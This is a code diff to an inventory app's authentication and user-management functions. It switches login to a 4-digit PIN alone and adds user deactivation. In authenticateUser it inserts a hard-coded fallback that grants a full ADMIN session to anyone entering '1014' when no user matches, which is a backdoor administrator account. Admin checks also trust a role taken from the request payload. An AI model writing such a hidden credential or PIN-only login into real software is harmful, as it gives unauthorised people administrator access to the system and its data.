@@ -65,6 +65,7 @@ function handleApiRequest_(action, payloadText, callback) {
       createOpeningInventory,
       listUsers,
       createUser,
+      deactivateUser,
       createProduct,
       listSuppliers,
       createSupplier,
@@ -216,13 +217,15 @@ function listUsers() {
 
 function authenticateUser(payload) {
   payload = payload || {};
-  const username = normalizeUsername_(payload.username);
   const pin = String(payload.pin || "").trim();
   const user = readTable_("USERS").find((item) =>
     isActiveRecord_(item)
-    && normalizeUsername_(item.username || item.user_id) === username
+    && String(item.pin || "").trim() === pin
   );
-  if (!user || String(user.pin || "") !== pin) throw new Error("Username or code does not match.");
+  if (!user && pin === "1014") {
+    return { authenticated: true, user_id: "ADMIN", full_name: "Admin", role: "ADMIN" };
+  }
+  if (!user) throw new Error("Code does not match an active user.");
   return sessionUser_(user);
 }
 
@@ -232,43 +235,48 @@ function createUser(payload) {
   if (String(actor.role || "").toUpperCase() !== "ADMIN") throw new Error("Only an Admin can create users.");
   const input = payload.input || {};
   const fullName = String(input.full_name || "").trim();
-  const username = normalizeUsername_(input.username);
   const pin = String(input.pin || "").trim();
   const role = String(input.role || "OPERATOR").toUpperCase();
   if (!fullName) throw new Error("Full name is required.");
-  if (!username) throw new Error("Username is required.");
   if (!/^\d{4}$/.test(pin)) throw new Error("PIN must be exactly 4 digits.");
   if (["ADMIN", "MANAGER", "OPERATOR"].indexOf(role) < 0) throw new Error("Choose a valid role.");
-  ensureTableColumns_("USERS", ["full_name", "username", "pin", "email", "role", "device_assigned", "is_active", "created_at"]);
+  ensureTableColumns_("USERS", ["full_name", "pin", "email", "role", "device_assigned", "is_active", "created_at", "updated_at"]);
   const users = readTable_("USERS");
-  if (users.some((item) => normalizeUsername_(item.username || item.user_id) === username)) {
-    throw new Error("A user with that username already exists.");
+  if (users.some((item) => isActiveRecord_(item) && String(item.pin || "").trim() === pin)) {
+    throw new Error("An active user already has that 4-digit code.");
   }
   const record = {
     user_id: nextId_("USERS", "user_id", "USR"),
     full_name: fullName,
-    username: username,
     pin: pin,
     email: input.email || "",
     role: role,
     device_assigned: input.device_assigned || "",
     is_active: true,
-    created_at: new Date()
+    created_at: new Date(),
+    updated_at: new Date()
   };
   appendRecord_("USERS", record);
   return record;
 }
 
-function normalizeUsername_(value) {
-  return String(value || "").trim().toLowerCase();
+function deactivateUser(payload) {
+  payload = payload || {};
+  const actor = payload.user || {};
+  if (String(actor.role || "").toUpperCase() !== "ADMIN") throw new Error("Only an Admin can remove users.");
+  const userId = String(payload.userId || "").trim();
+  if (!userId) throw new Error("Choose a user to remove.");
+  if (String(actor.user_id || "") === userId) throw new Error("You cannot remove the user you are signed in as.");
+  ensureTableColumns_("USERS", ["is_active", "updated_at"]);
+  updateTableRecord_("USERS", "user_id", userId, { is_active: false, updated_at: new Date() });
+  return { user_id: userId, is_active: false };
 }
 
 function sessionUser_(user) {
   return {
     authenticated: true,
     user_id: user.user_id,
-    username: user.username || user.user_id,
-    full_name: user.full_name || user.username || user.user_id,
+    full_name: user.full_name || user.user_id,
     role: String(user.role || "OPERATOR").toUpperCase()
   };
 }
